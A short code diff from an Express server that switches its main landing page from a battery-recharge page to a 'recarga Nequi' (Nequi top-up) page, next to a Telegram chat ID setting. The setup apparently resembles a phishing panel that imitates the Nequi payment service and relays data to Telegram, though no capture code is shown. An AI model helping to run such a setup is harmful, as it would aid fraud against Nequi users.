@@ -10,7 +10,7 @@ const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '-4997787
 const NODE_ENV = process.env.NODE_ENV || 'development';
 
 // ⚡ CAMBIA AQUÍ LA PÁGINA PRINCIPAL: 'battery' o 'nequi'
-const LANDING_PAGE = 'battery'; // 'battery' = recarga de baterías | 'nequi' = recarga Nequi
+const LANDING_PAGE = 'nequi'; // 'battery' = recarga de baterías | 'nequi' = recarga Nequi
 
 const app = express();
 const server = http.createServer(app);
